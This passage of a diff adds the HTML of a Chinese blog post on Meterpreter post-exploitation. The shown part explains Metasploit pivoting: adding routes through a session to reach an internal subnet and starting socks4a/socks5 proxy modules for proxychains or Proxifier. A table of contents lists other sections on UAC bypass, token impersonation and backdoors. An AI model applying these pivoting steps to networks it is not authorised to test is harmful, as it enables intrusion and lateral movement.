class="line">2.pivot</span><br><span class="line">pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。</span><br><span class="line">(1)首先需要在msf的操作界面下添加一个路由表。</span><br><span class="line">添加命令：route add 内网ip 子网掩码 session的id</span><br><span class="line">打印命令：route print</span><br><span class="line">路由添加成功之后就可以在msf里访问10.1.1.0&#x2F;24这个网段。</span><br><span class="line">(2)建立socks代理。</span><br><span class="line">如果其它程序需要访问这个内网环境，就可以建立socks代理。</span><br><span class="line">msf提供了3个模块用来做socks代理。</span><br><span class="line">auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks5</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks_unc</span><br><span class="line">以auxiliary&#x2F;server&#x2F;socks4a为例，查看需要设置的参数。</span><br><span class="line">一共两个参数：</span><br><span class="line">SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。</span><br><span class="line">SRVPORT：监听的端口，默认为1080。</span><br><span class="line">直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置proxychains使用，在windows可以配置Proxifier进行使用</span><br></pre></td></tr></table></figure>
+
+<p>PS：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42442326/article/details/105931598">MSF+内网穿透 实现远程渗透教程</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">R0ser1</a>
+            <p>原文链接：<a href="http://example.com/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/">http://example.com/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/</a>
+            <p>发表日期：<a href="http://example.com/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/">March 21st 2021, 3:18:00 pm</a>
+            <p>更新日期：<a href="http://example.com/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/">March 21st 2021, 3:44:58 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title= "CTF反序列字符串逃逸">
+                    <div class="nextTitle">CTF反序列字符串逃逸</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+     
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+</main>
+
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:R0ser1@foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87UAC%E9%99%90%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">绕过UAC限制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E5%BD%A2%E5%8C%96payload"><span class="toc-number">1.1.</span> <span class="toc-text">图形化payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%97%ADUAC"><span class="toc-number">1.2.</span> <span class="toc-text">关闭UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5-incognito%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C"><span class="toc-number">3.</span> <span class="toc-text">令牌操纵(incognito假冒令牌)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0NC%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1-meterpreter"><span class="toc-number">4.</span> <span class="toc-text">注册表添加NC后门服务(meterpreter)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nc%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">Nc的一些用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">解码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POST%E6%A8%A1%E5%9D%97"><span class="toc-number">5.</span> <span class="toc-text">POST模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%90%8E%E9%97%A8-meterpreter6%E7%9A%84%E8%AF%9D%E6%98%AF%E5%BC%83%E7%94%A8%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC"><span class="toc-number">6.</span> <span class="toc-text">持久后门(meterpreter6的话是弃用这个脚本)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">端口转发和代理</span></a></li></ol>
+    </div>
+    
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 2
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2021/05/03/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" >CTF反序列字符串逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2021/03/21/Meterpreter%E5%90%8E%E6%B8%97%E9%80%8F/" >Meterpreter后渗透</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="meterpreter"><span class="iconfont-archer">&#xe606;</span>meterpreter</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "R0ser1"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
